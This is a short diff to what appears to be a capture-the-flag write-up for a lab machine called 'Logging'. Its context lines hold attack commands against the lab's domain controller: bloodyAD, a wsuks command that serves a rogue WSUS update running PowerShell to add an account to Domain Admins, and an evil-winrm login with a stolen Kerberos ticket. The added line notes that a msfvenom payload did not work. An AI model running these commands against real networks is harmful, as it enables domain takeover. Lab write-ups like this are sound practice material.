@@ -77,6 +77,8 @@ faketime -f "+7h" bloodyAD --host dc01.logging.htb --dc-ip 10.129.29.78 -d loggi
 
 sudo wsuks --serve-only --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0 -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \"Domain Admins\" -Members \"MSA_HEALTH$\""'
 
+// This method didnt work: Just put in Temp a msfvenom payload and then call it with wsuk
+
 faketime -f "+7h" evil-winrm -i dc01.logging.htb -r logging.htb -K ~/HTB/Logging/GhhGNDDY.ccache
 
 ```
